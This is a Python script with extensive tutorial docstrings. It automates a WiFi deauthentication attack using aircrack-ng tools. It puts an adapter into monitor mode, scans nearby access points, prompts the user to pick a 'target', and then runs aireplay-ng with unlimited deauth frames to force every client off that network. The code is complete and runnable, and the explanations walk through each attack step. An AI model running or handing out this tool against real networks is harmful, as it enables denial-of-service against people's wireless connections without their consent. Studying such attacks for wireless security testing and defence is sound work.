#!/usr/bin/env python3
#This ensures the script runs using Python 3.

import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime 

"""
- subprocess: Allows your script to run system commands and programs, acting as a terminal interface.
- re: Provides regular expressions for pattern matching.
- csv: Handles reading and writing of CSV files.
- os: Interacts with the operating system, including file handling and environment variables.
- time: Enables delays for better execution control.
- shutil: Short for "shell utilities," it simplifies file and directory operations with high-level functions, 
  offering more convenience than the basic os module.
- datetime: Used for generating timestamps.
"""

active_wireless_networks = []
# Create an empty list

def check_for_essid(essid, lst):
    check_status = True
    if len(lst) == 0:
        return check_status
    for item in lst:
        if essid == item["ESSID"]:
            check_status = False
    return check_status

"""
This function checks whether a given wireless network name (ESSID) already exists in a list of network dictionaries. 
It helps prevent duplicate networks from being added to the active_wireless_networks list in your script.

Input:
- essid: A string representing the network name (e.g., "MyWiFi").
- lst: A list of dictionaries, where each dictionary represents a wireless network and has an "ESSID" key 
  (e.g., [{"BSSID": "00:11:22:33:44:55", "ESSID": "MyWiFi"}, ...]).

Output:
- True if the ESSID is not in the list (or the list is empty), meaning it’s okay to add it.
- False if the ESSID is already in the list, meaning it’s a duplicate.

Step-by-Step Explanation:

1. Function Definition:
   - def check_for_essid(essid, lst): 
   - Defines a function named check_for_essid that takes two parameters: essid and lst.

2. Initialize check_status:
   - check_status = True
   - Assumes the ESSID is unique and can be added.

3. Check if List is Empty:
   - if len(lst) == 0:
   - If the list is empty, return True immediately (no duplicates exist).

4. Loop Through the List:
   - for item in lst:
   - Iterates over each dictionary (item) in the list lst.

5. Check for ESSID Match:
   - if essid == item["ESSID"]:
   - Compares the given essid with the "ESSID" value in each dictionary.
   - If a match is found, set check_status to False (ESSID is a duplicate).

6. Return the Result:
   - return check_status
   - If no match is found, returns True (ESSID is unique).
   - If a match is found, returns False (ESSID is a duplicate).
"""


if not 'SUDO_UID' in os.environ.keys():
    print("Root access is required. Please execute this with sudo.")
    exit()

"""
This code checks whether the script is running with superuser (root) privileges using sudo. 
If it’s not, it prints a message and terminates the program. 
This check is necessary because certain commands like airmon-ng and aireplay-ng require root access 
to manipulate network interfaces.

Step-by-Step Explanation:

1. os.environ.keys():
   - os.environ is part of the os module (imported with import os).
   - It is a dictionary-like object that contains the environment variables of the current process.
   - Examples of environment variables: PATH, HOME, USER, etc.
   - .keys() returns a view of all the keys (variable names) in os.environ.

2. 'SUDO_UID' in os.environ.keys():
   - 'SUDO_UID' is an environment variable set by the sudo command.
   - It stores the user ID (UID) of the original user who invoked sudo (not the root UID, which is 0).
   - Example: If a user with UID 1000 runs sudo python3 script.py, SUDO_UID is set to "1000".
   - The in operator checks whether 'SUDO_UID' is present in os.environ.keys().
   - Returns True if the script was launched with sudo (root privileges), otherwise False.
"""

for file_name in os.listdir():
    if ".csv" in file_name:
        print("Existing .csv files detected in your directory. Moving them to a backup folder now.")
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print("The backup directory is already present.")
        timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)
        
"""
This code is a cleanup routine that runs near the start of your script. 
Its purpose is to:

- Find any existing .csv files in the current working directory.
- Move them to a backup/ subdirectory with a timestamp added to their names.
- Ensure old .csv files do not interfere with new ones generated by airodump-ng later in the script.

### Line-by-Line Explanation:

1. **for file_name in os.listdir():**
   - `os.listdir()` is a function from the `os` module that returns a list of all files and directories 
     in the current working directory (where the script is run).
   - Example: If the directory contains `script.py`, `file-01.csv`, and `data.txt`, it returns 
     `["script.py", "file-01.csv", "data.txt"]`.
   - The `for` loop iterates over this list, assigning each filename (as a string) to the variable 
     `file_name` one at a time.
   - This loop ensures that every item in the directory is checked.

2. **if ".csv" in file_name:**
   - Uses the `in` operator to check if the string `".csv"` is a substring of `file_name`.
   - This condition returns `True` if the filename contains `.csv` anywhere (e.g., `file-01.csv`, `data.csv`).
   - Returns `False` otherwise (e.g., `script.py`).
   - Purpose: Filters the loop to only process `.csv` files, ignoring other files or directories.

3. **print("Existing .csv files detected in your directory. Moving them to a backup folder now."):**
   - Prints a message to inform the user that `.csv` files were found and will be moved.
   - When: Runs for each `.csv` file found, so this message may appear multiple times if multiple `.csv` files exist.

4. **directory = os.getcwd():**
   - `os.getcwd()` is another function from the `os` module that returns the current working directory as a string.
   - Example: If the script is run from `/home/user/`, `directory` becomes `"/home/user"`.
   - Purpose: Stores the current directory path to use later when creating the `backup/` folder and moving files.

5. **try:**
   - Starts a `try/except` block to handle potential errors gracefully.
   - Why: The next line attempts to create a directory, which might fail if it already exists.

6. **os.mkdir(directory + "/backup/"):**
   - `os.mkdir(path)`: Creates a new directory at the specified `path`.
   - `directory + "/backup/"`: Concatenates the current directory path with `"/backup/"` to form a full path.
   - Example: If `directory = "/home/user"`, the created folder path is `"/home/user/backup/"`.
   - Purpose: Creates a `backup/` subdirectory to store the `.csv` files.
   - Behavior:
     - Succeeds if the directory does not exist yet.
     - Raises an exception (e.g., `FileExistsError`) if it already exists.

7. **except:**
   - Catches any exception thrown by `os.mkdir()`.
   - Common Case: Catches `FileExistsError` when `backup/` already exists (e.g., from a previous run).
   - Note: This is a bare `except`, meaning it catches all exceptions, not just `FileExistsError`. 
     A more specific `except FileExistsError:` would be safer, but this works for a simple case.

8. **print("The backup directory is already present."):**
   - Prints a message if the `backup/` directory already exists and `os.mkdir()` failed.
   - When: Runs only if an exception occurs in the `try` block.

9. **timestamp = datetime.now():**
   - `datetime.now()` comes from the `datetime` module (`from datetime import datetime`).
   - It returns the current date and time as a `datetime` object.
   - Example: `2025-03-13 15:45:23.123456`.
   - Purpose: Generates a unique timestamp to prepend to the filename, ensuring moved files do not overwrite each other.

10. **shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name):**
    - `shutil.move(src, dst)`: A function from the `shutil` module that moves a file from `src` to `dst`.
    - Arguments:
      - `file_name`: The source filename (e.g., `file-01.csv`).
      - `directory + "/backup/" + str(timestamp) + "-" + file_name`: The destination path.
    - `str(timestamp)` converts the `datetime` object to a string (e.g., `"2025-03-13 15:45:23.123456"`).
    - Example:
      - If `directory = "/home/user"`, `timestamp = "2025-03-13 15:45:23.123456"`, and `file_name = "file-01.csv"`,
      - The destination path becomes `"/home/user/backup/2025-03-13 15:45:23.123456-file-01.csv"`.
    - Action: Moves the `.csv` file to the `backup/` folder with a timestamp prefix.

### Does `shutil.move()` Create the File?
- **No**, in the sense that it does not create new content. `shutil.move()` does not generate a new file from scratch; 
  instead, it relocates an existing file to a new path with a new name.
- **Yes**, in the sense that the destination filename (e.g., `2025-03-13 15:45:23.123456-file-01.csv`) 
  did not exist before the move. The act of moving effectively "creates" this new filename in the `backup/` directory, 
  but it is simply renaming and relocating the original file's content.
"""

wlan_pattern = re.compile("^wlan[0-9]+")
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

if len(check_wifi_result) == 0:
    print("No WiFi adapter found. Please attach one and retry.")
    exit()

"""
This piece of code detects available WiFi adapters on a system using regular expressions (re module) 
and system commands (subprocess.run()). Below is a detailed explanation of how it works:

1. Understanding the Regular Expression:
   wlan_pattern = re.compile("^wlan[0-9]+")
   - Creates a compiled regular expression (regex) pattern using re.compile().
   - The pattern "^wlan[0-9]+" matches wireless network interfaces (e.g., wlan0, wlan1, wlan2, etc.).

   Breaking Down the Pattern:
   - ^: Matches the beginning of the string, ensuring that the interface name starts with "wlan".
   - wlan: The literal string "wlan", which is the standard prefix for WiFi interfaces in Linux.
   - [0-9]+: Matches one or more digits (0-9), ensuring we match interface names like wlan0, wlan1, wlan2, etc.

   Examples of Matches:
   ✅ Valid Matches:
      - wlan0
      - wlan1
      - wlan10
      - wlan23

   ❌ Invalid Matches (will not match):
      - eth0 (Ethernet adapter)
      - lo (Loopback interface)
      - wlan (Missing number)
      - wlanX (Contains a letter instead of a number)

2. Running the iwconfig Command:
   check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

   Breaking it Down:
   - subprocess.run(["iwconfig"], capture_output=True).stdout.decode()
     - Runs the Linux command iwconfig, which displays network interfaces and their wireless settings.
     - Example output of iwconfig:

       wlan0     IEEE 802.11  ESSID:off/any  
                 Mode:Managed  Access Point: Not-Associated   
                 Tx-Power=20 dBm   
       lo        no wireless extensions.
       eth0      no wireless extensions.

     - subprocess.run(["iwconfig"]): Executes the iwconfig command.
     - capture_output=True: Captures the command’s output instead of printing it to the terminal.
     - .stdout: Accesses the standard output of iwconfig as a bytes object.
     - .decode(): Converts the bytes output to a string (using UTF-8 by default).

   - wlan_pattern.findall(...):
     - Uses the regex pattern wlan_pattern to find all matching wireless interface names (e.g., wlan0, wlan1) 
       in the iwconfig output.

3. Example Output of check_wifi_result:
   - If the system has a wireless interface wlan0:
     check_wifi_result = ["wlan0"]

   - If the system has multiple interfaces (wlan0 and wlan1):
     check_wifi_result = ["wlan0", "wlan1"]

   - If there are no WiFi adapters:
     check_wifi_result = []
"""

print("Here are the available WiFi interfaces:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

while True:
    wifi_interface_choice = input("Which interface would you like to use for the attack? ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Enter a valid number from the list provided.")

hacknic = check_wifi_result[int(wifi_interface_choice)]

"""
This section of code is responsible for displaying a list of detected wireless interfaces (e.g., wlan0, wlan1) 
from check_wifi_result, prompting the user to select one by entering its index number, and validating the input. 
It ensures that the user picks a valid WiFi adapter before proceeding.

### Line-by-Line Explanation:

1. **print("Here are the available WiFi interfaces:")**
   - Prints a header message to inform the user that a list of WiFi interfaces is about to be displayed.
   - This follows the earlier check where check_wifi_result was populated with wireless interfaces 
     (e.g., ["wlan0", "wlan1"]) using iwconfig and regex.

2. **for index, item in enumerate(check_wifi_result):**
   - `enumerate(check_wifi_result)`:
     - A built-in Python function that takes an iterable (in this case, check_wifi_result, a list) 
       and returns pairs of (index, value).
     - Example if `check_wifi_result = ["wlan0", "wlan1"]`:
       - (0, "wlan0")
       - (1, "wlan1")
   - `for index, item in ...`:
     - Loops over these pairs, assigning `index` (an integer) and `item` (a string like "wlan0").

3. **print(f"{index} - {item}")**
   - Uses an f-string (`f"...")` to embed `index` and `item` directly in the output.
   - Example output if `check_wifi_result = ["wlan0", "wlan1"]`:
     ```
     Here are the available WiFi interfaces:
     0 - wlan0
     1 - wlan1
     ```
   - The numbered list provides an easy way for the user to select an interface.

4. **while True:**
   - Starts an infinite loop that will continue until the user provides a valid interface selection.
   - Ensures that the script keeps asking for input until a correct choice is made.

5. **wifi_interface_choice = input("Which interface would you like to use for the attack? ")**
   - Displays the prompt `"Which interface would you like to use for the attack?"` and waits for user input.
   - The user’s input is stored as a string in `wifi_interface_choice`.

6. **try:**
   - Begins a `try/except` block to handle potential errors when processing user input.

7. **if check_wifi_result[int(wifi_interface_choice)]:**
   - `int(wifi_interface_choice)`: 
     - Converts the user’s string input (e.g., `"0"`) to an integer (e.g., `0`).
     - If the input is not a valid integer (e.g., `"abc"`), it raises a `ValueError`.
   - `check_wifi_result[int(...)]`:
     - Uses the integer value to index into `check_wifi_result`.
     - Example: If `wifi_interface_choice = "0"`, then `check_wifi_result[0] → "wlan0"`.
     - If the index is out of range (e.g., `"5"` when `check_wifi_result` only has indices `0` and `1`), 
       it raises an `IndexError`.
   - `if ...:`:
     - In Python, any non-empty string (such as `"wlan0"`) evaluates to `True` in a boolean context.
     - This ensures that the indexed value exists and is valid.

8. **break**
   - Exits the `while True` loop once a valid input is provided.

9. **except:**
   - Catches any exceptions that occur within the `try` block.
   - Possible exceptions:
     - `ValueError`: Raised if `int(wifi_interface_choice)` fails (e.g., when input is `"abc"`).
     - `IndexError`: Raised if the integer is out of range (e.g., `"5"` when only two interfaces exist).
   - A more precise way to handle these exceptions would be:
     ```python
     except (ValueError, IndexError):
     ```
     - This explicitly catches only `ValueError` and `IndexError`, avoiding unintended behavior from catching all exceptions.

10. **hacknic = check_wifi_result[int(wifi_interface_choice)]**
    - Assigns the selected wireless interface (e.g., `"wlan0"`) to the variable `hacknic`.
    - Stores the user’s choice from `check_wifi_result` so it can be used in the next steps of the script.
"""

print("WiFi adapter is ready!\nLet’s terminate any interfering processes:")
kill_confilict_processes = subprocess.run(["sudo", "airmon-ng", "check", "kill"])

print("Switching the WiFi adapter to monitor mode:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

"""
Purpose:
This code prepares the selected WiFi adapter (hacknic) for an attack by terminating interfering 
processes and switching the adapter to monitor mode. It ensures the adapter is free from 
conflicting operations and configured to capture wireless traffic, setting the stage for 
subsequent scanning and deauthentication steps.

Code:
# Killing Interfering Processes
kill_confilict_processes = subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# Switching WiFi Adapter to Monitor Mode
print("Switching the WiFi adapter to monitor mode:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

Explanation:
1. Killing Interfering Processes
   - Code: kill_confilict_processes = subprocess.run(["sudo", "airmon-ng", "check", "kill"])
   - What This Does:
     - Runs the command: sudo airmon-ng check kill
     - 'airmon-ng check kill' detects and terminates processes that might interfere with WiFi 
       monitoring.
     - Processes like NetworkManager, wpa_supplicant, or DHCP clients can prevent the adapter 
       from entering Monitor Mode.
   - Why This Is Necessary:
     - If these processes remain active, they may reconnect the adapter to a WiFi network, 
       disrupting monitoring.
     - Terminating them ensures uninterrupted monitoring and packet capture.

2. Switching WiFi Adapter to Monitor Mode
   - Code: print("Switching the WiFi adapter to monitor mode:")
           put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])
   - What This Does:
     - Runs the command: sudo airmon-ng start <WiFi_interface>
     - '<WiFi_interface>' is the user-selected interface (e.g., wlan0), stored in 'hacknic'.
     - This command switches the WiFi adapter from Managed Mode to Monitor Mode.
     - In Monitor Mode, the adapter can capture all wireless packets within range.
   - Why This Is Necessary:
     - Most WiFi adapters default to Managed Mode (communicating only with connected networks).
     - Monitor Mode is required for:
       - Packet sniffing (capturing WiFi traffic).
       - Deauthentication attacks (disconnecting devices from a network).
       - Handshake capturing (for password cracking with aircrack-ng).
"""

discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

"""
Launches airodump-ng in the background to scan for nearby wireless access points and stations.
Writes scan results to a CSV file continuously, which the script later reads to display available networks.
This marks the start of the network discovery phase, running asynchronously while the script processes the output.

Line Breakdown:
1. subprocess.Popen([...])
   - Description: A function from the subprocess module (imported earlier with 'import subprocess').
   - Behavior: Unlike subprocess.run(), which waits for command completion, Popen starts a process and 
     returns a Popen object immediately, allowing it to run in the background.
   - Purpose: airodump-ng is a long-running tool that scans until stopped (e.g., with Ctrl+C). Popen 
     enables it to run continuously while the script reads the output file in a loop.

2. Command List: ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", hacknic + "mon"]
   - Components:
     - 'sudo': Runs the command with superuser privileges, required for airodump-ng to access the 
       network interface in monitor mode.
     - 'airodump-ng': A tool from the Aircrack-ng suite that captures wireless packets and displays 
       information about access points (APs) and connected stations. In monitor mode, it sniffs all 
       wireless traffic on the specified interface.
     - '-w file': 
       - '-w': Specifies writing output to a file.
       - 'file': Base name for output files; airodump-ng appends a number (e.g., file-01.csv).
       - Purpose: Saves scan data to disk instead of just displaying it in the terminal.
     - '--write-interval 1':
       - Option: Sets how often (in seconds) airodump-ng updates the output file.
       - '1': Updates every 1 second.
       - Purpose: Ensures the CSV file is refreshed frequently for real-time data access by the script.
     - '--output-format csv':
       - Option: Defines the output file format.
       - 'csv': Comma-separated values, a structured format parsable by the csv module.
       - Purpose: Facilitates programmatic reading of AP details (e.g., BSSID, ESSID, channel).
     - 'hacknic + "mon"':
       - 'hacknic': The selected wireless interface (e.g., "wlan0") from earlier 
         (hacknic = check_wifi_result[int(wifi_interface_choice)]).
       - '+ "mon"': Appends "mon" to form the monitor mode interface name (e.g., "wlan0mon").
       - Context: Set by the prior 'airmon-ng start hacknic', which enables monitor mode on wlan0 as wlan0mon.
       - Purpose: Specifies the interface for airodump-ng to use for sniffing.

3. stdout=subprocess.DEVNULL
   - Description: Redirects the standard output stream, where airodump-ng typically displays a live 
     table of APs.
   - subprocess.DEVNULL: A special file-like object that discards output (similar to /dev/null in Unix).
   - Effect: Suppresses airodump-ng’s terminal output, keeping the script’s interface clean since it 
     reads the CSV file instead.

4. stderr=subprocess.DEVNULL
   - Description: Redirects the standard error stream for airodump-ng’s error messages.
   - subprocess.DEVNULL: Discards errors as well.
   - Effect: Prevents error messages (e.g., interface warnings) from cluttering the terminal.

5. discover_access_points = ...
   - Assignment: Stores the Popen object in 'discover_access_points'.
   - Purpose: Allows later interaction with the process (e.g., discover_access_points.terminate() to 
     stop it), though this script does not currently utilize this functionality.
"""
try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
            if ".csv" in file_name:
                with open(file_name) as csv_h:
                    csv_h.seek(0)
                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                    for row in csv_reader:
                        if row["BSSID"] == "BSSID":
                            pass
                        elif row["BSSID"] == "Station MAC":
                            break
                        elif check_for_essid(row["ESSID"], active_wireless_networks):
                            active_wireless_networks.append(row)

        print("Currently scanning networks. Hit Ctrl+C to pick a target for the attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)

except KeyboardInterrupt:
    print("\nTime to choose your target.")
    
"""
Purpose:
This code continuously scans and displays nearby wireless networks by reading the CSV file generated 
by airodump-ng (started earlier with subprocess.Popen). It builds a list of unique access points in 
'active_wireless_networks' and allows the user to stop scanning with Ctrl+C to select a target 
network for the attack. This is the main scanning loop, presenting a live-updating table of 
detected networks.

Line-by-Line Explanation:
1. try:
   - Purpose: Starts a try/except block to catch exceptions, specifically the KeyboardInterrupt raised 
     when the user presses Ctrl+C.
   - Why: The loop runs indefinitely (while True), and Ctrl+C provides a graceful exit mechanism.

2. while True:
   - Action: Creates an infinite loop that runs until interrupted.
   - Purpose: Continuously updates the list and display of wireless networks as airodump-ng writes 
     new data to the CSV file.

3. subprocess.call("clear", shell=True)
   - subprocess.call(): Runs a command and waits for it to finish, returning the exit code.
   - Command: "clear" - A shell command to clear the terminal screen.
   - shell=True: Executes the command via the shell, necessary since 'clear' is a shell builtin, 
     not a standalone executable.
   - Effect: Clears the terminal each loop iteration to refresh the display, preventing clutter 
     from previous outputs.

4. for file_name in os.listdir():
   - os.listdir(): Lists all files and directories in the current working directory.
   - Loop: Iterates over each filename (e.g., "file-01.csv", "script.py").
   - Purpose: Searches for .csv files written by airodump-ng.

5. fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 
                 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 
                 'ESSID', 'Key']
   - Description: A list of column names matching the structure of airodump-ng’s CSV output for 
     access points.
   - Purpose: Used by csv.DictReader to map CSV columns to dictionary keys.
   - Details: Mirrors airodump-ng’s CSV format, which lacks headers. Each field represents:
     - BSSID: MAC address of the access point (e.g., 00:11:22:33:44:55).
     - First_time_seen: Timestamp of first detection (e.g., 2025-03-16 05:00:00).
     - Last_time_seen: Timestamp of last observation (e.g., 2025-03-16 05:05:00).
     - channel: WiFi channel used (e.g., 6).
     - Speed: Maximum data rate in Mbps (e.g., 54).
     - Privacy: Encryption type (e.g., WPA2, OPN).
     - Cipher: Encryption cipher (e.g., CCMP, TKIP).
     - Authentication: Authentication method (e.g., PSK).
     - Power: Signal strength in dBm (e.g., -70).
     - beacons: Number of beacon frames sent (e.g., 123).
     - IV: Number of initialization vectors captured (e.g., 0).
     - LAN_IP: Local network IP, if known (e.g., 192.168.1.1 or 0.0.0.0).
     - ID_length: ESSID length in bytes (e.g., 6).
     - ESSID: Network name (e.g., MyWiFi).
     - Key: Captured key, if any (usually empty).

6. if ".csv" in file_name:
   - Condition: Checks if the filename contains ".csv" (e.g., "file-01.csv").
   - Purpose: Filters to process only CSV files, ignoring others (e.g., "script.py").

7. with open(file_name) as csv_h:
   - Action: Opens the CSV file in read mode ("r" is default), assigning the file object to csv_h.
   - with: Ensures the file closes properly after use, even if an error occurs.

8. csv_h.seek(0)
   - Action: Moves the file pointer to the start of the file (position 0).
   - Purpose: Ensures reading begins from the top each iteration, as the file may have been 
     appended by airodump-ng.
   - Note: Old data isn’t re-displayed due to check_for_essid filtering duplicates in 
     active_wireless_networks.

9. csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
   - csv.DictReader: From the csv module (imported with 'import csv'). Reads the CSV and returns 
     each row as a dictionary using 'fieldnames' as keys.
   - Example: CSV line "00:11:22:33:44:55, 2025-03-13 15:00:00, ..., MyWiFi" becomes 
     {"BSSID": "00:11:22:33:44:55", "ESSID": "MyWiFi", "channel": "6", ...}.

10. for row in csv_reader:
    - Loop: Iterates over each row in the CSV as a dictionary.
    - Purpose: Processes rows to filter and build the active_wireless_networks list.

11. if row["BSSID"] == "BSSID": pass
    - Condition: Checks if "BSSID" column value is literally "BSSID".
    - Why: Acts as a defensive check for a potential header row or artifact (rare in standard 
      airodump-ng CSV, which starts with data).
    - pass: Skips this row, ensuring it’s not treated as an AP.

12. elif row["BSSID"] == "Station MAC": break
    - Condition: Checks if "BSSID" column contains "Station MAC".
    - Why: Marks the start of the stations section in airodump-ng’s CSV (after AP data).
    - break: Exits the loop, stopping before processing station data (script targets APs only).

13. elif check_for_essid(row["ESSID"], active_wireless_networks):
    - check_for_essid: A function that returns True if row["ESSID"] isn’t in active_wireless_networks.
    - Condition: True if the ESSID is unique or the list is empty.
    - active_wireless_networks.append(row): Adds the AP dictionary to the list if not a duplicate.

14. print("Currently scanning networks. Hit Ctrl+C to pick a target for the attack.\n")
    - Purpose: Informs the user that scanning is ongoing and how to proceed.

15. print("No |\tBSSID              |\tChannel|\tESSID                         |")
    - Purpose: Prints a table header with columns separated by tabs.

16. print("___

|\t___________________|\t_______|\t______________________________|")
    - Purpose: Prints a separator line under the header.

17. for index, item in enumerate(active_wireless_networks):
    - enumerate: Pairs each AP dictionary with an index (e.g., (0, {"BSSID": "00:11:22:33:44:55", ...})).

18. print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
    - Action: Prints each AP’s index, BSSID, channel, and ESSID.
    - .strip(): Removes whitespace from channel.

19. time.sleep(1)
    - Action: Pauses for 1 second.
    - Purpose: Updates the display every second, aligning with airodump-ng’s --write-interval 1.

20. except KeyboardInterrupt:
    - What it catches: KeyboardInterrupt, raised by Ctrl+C.
    - Purpose: Exits the loop gracefully when the user stops scanning.

21. print("\nTime to choose your target.")
    - Purpose: Confirms scanning has stopped and prompts target selection.
"""

while True:
    choice = input("Pick a network from the list above: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("That’s not a valid option. Try again.")

hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

"""
Purpose:
This code prompts the user to select a network from the list of detected WiFi networks 
(active_wireless_networks) displayed earlier. It validates the user’s input to ensure it’s a valid 
index and extracts the BSSID and channel of the chosen network for the subsequent deauthentication 
attack. This is the target selection phase, transitioning from discovery to attack setup.

Line-by-Line Explanation:
1. while True:
   - Action: Starts an infinite loop that continues until explicitly exited with 'break'.
   - Purpose: Repeatedly prompts the user for input until a valid choice is provided.

2. choice = input("Pick a network from the list above: ")
   - input(prompt): Displays "Pick a network from the list above: " and waits for user input, 
     returning it as a string (e.g., "0", "1", or "abc").
   - Assignment: Stores the user’s input in 'choice' as a string.
   - Context: Follows the scanning loop where 'active_wireless_networks' was displayed (e.g., 
     "0    00:11:22:33:44:55    6    MyWiFi").

3. try:
   - Purpose: Begins a try/except block to handle potential errors when converting and indexing 
     the input.

4. if active_wireless_networks[int(choice)]:
   - int(choice): Converts the string 'choice' to an integer (e.g., "0" → 0). Raises ValueError 
     if not a valid integer (e.g., "abc").
   - active_wireless_networks[int(choice)]: Indexes into 'active_wireless_networks', a list of 
     dictionaries (e.g., [{"BSSID": "00:11:22:33:44:55", "ESSID": "MyWiFi", "channel": "6"}, ...]). 
     Returns the dictionary at that index (e.g., active_wireless_networks[0] → 
     {"BSSID": "00:11:22:33:44:55", ...}). Raises IndexError if the index is out of range (e.g., 
     "5" when the list has only 2 items).
   - if ...: Checks if the result is truthy. A non-empty dictionary is always True in Python, 
     effectively testing if the index is valid.
   - Purpose: Validates that 'choice' corresponds to an existing network in the list.

5. break
   - Action: Exits the 'while True' loop if the 'if' condition passes (i.e., the input is valid).
   - When: Executes only if no exceptions occur and the indexed item exists.

6. except:
   - What it catches: Any exception from the 'try' block:
     - ValueError: If int(choice) fails (e.g., "abc").
     - IndexError: If the integer is out of bounds (e.g., "5" for a 2-item list).
   - Note: A bare 'except' catches all exceptions, which is broad but sufficient here.

7. print("That’s not a valid option. Try again.")
   - Action: Prints an error message if an exception occurs.
   - Effect: The loop continues, prompting the user again.

8. hackbssid = active_wireless_networks[int(choice)]["BSSID"]
   - int(choice): Converts 'choice' to an integer again (safe, as the loop exits only with a valid 
     input).
   - active_wireless_networks[int(choice)]: Accesses the dictionary for the chosen network.
   - ["BSSID"]: Extracts the "BSSID" value (e.g., "00:11:22:33:44:55"), the MAC address of the 
     access point.
   - Assignment: Stores it in 'hackbssid' for use in the deauthentication attack.

9. hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
   - ["channel"]: Extracts the "channel" value (e.g., "6 "), the WiFi channel of the AP.
   - .strip(): Removes leading/trailing whitespace (e.g., "6 " → "6").
   - Assignment: Stores it in 'hackchannel' for setting the interface’s channel later.
"""

subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])

"""
Purpose:
This code sets the WiFi adapter’s channel to match the target network’s channel and launches a 
deauthentication attack against the target access point (AP) to disrupt connected devices. It 
represents the attack phase of the script, following network selection.

Line-by-Line Explanation:
1. subprocess.run(["airmon-ng", "start", hacknic + 'mon', hackchannel])
   - subprocess.run(): Executes the command and waits for it to complete, returning a 
     CompletedProcess object.
   - Command: ["airmon-ng", "start", hacknic + 'mon', hackchannel]
     - 'airmon-ng': A tool from Aircrack-ng for managing wireless interfaces.
     - 'start': Typically enables monitor mode, but here adjusts an existing monitor mode 
       interface.
     - 'hacknic + "mon"': The monitor mode interface (e.g., "wlan0mon"), set earlier by 
       'airmon-ng start hacknic'.
       - 'hacknic': Selected interface (e.g., "wlan0") from 
         'check_wifi_result[int(wifi_interface_choice)]'.
       - '"mon"': Appended when monitor mode was enabled.
     - 'hackchannel': The target AP’s channel (e.g., "6"), from 
       'active_wireless_networks[int(choice)]["channel"].strip()'.
   - What it does:
     - Adjusts the monitor mode interface (e.g., wlan0mon) to operate on the specific channel 
       (hackchannel) of the target AP.
     - Example: 'airmon-ng start wlan0mon 6' sets wlan0mon to channel 6.
     - Note: While 'airmon-ng start' is typically for initial monitor mode setup, it can 
       reconfigure the channel here; 'iwconfig' or 'iw' is more common for channel changes post-monitor mode.
   - Why: Ensures the adapter is on the same channel as the target AP, necessary for 
     'aireplay-ng' to send packets effectively.

2. subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + 'mon'])
   - subprocess.run(): Runs the command and waits for completion, returning a CompletedProcess 
     object.
   - Command: ["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + 'mon']
     - 'aireplay-ng': A tool from Aircrack-ng for injecting packets into wireless networks.
     - '--deauth': Specifies a deauthentication attack.
     - '0': Number of deauth packets to send; "0" means unlimited (continuous sending until 
       interrupted).
     - '-a hackbssid':
       - '-a': Option specifying the target AP’s BSSID (MAC address).
       - 'hackbssid': The target AP’s BSSID (e.g., "00:11:22:33:44:55"), from 
         'active_wireless_networks[int(choice)]["BSSID"]'.
     - 'check_wifi_result[int(wifi_interface_choice)] + "mon"': The monitor mode interface 
       (e.g., "wlan0mon").
       - Same as 'hacknic + "mon"', accessed directly from 'check_wifi_result' using the 
         user’s initial interface choice.
   - What it does:
     - Launches a deauthentication attack against the AP specified by 'hackbssid'.
     - Sends continuous deauth packets via wlan0mon, spoofing frames to trick connected devices 
       into disconnecting from the AP.
     - Example: 'aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon'.
     - Effect: Clients lose connection to the AP, achieving a Denial-of-Service (DoS) outcome.
   - Why: This is the core attack mechanism, disrupting the target network by forcing devices off.
"""













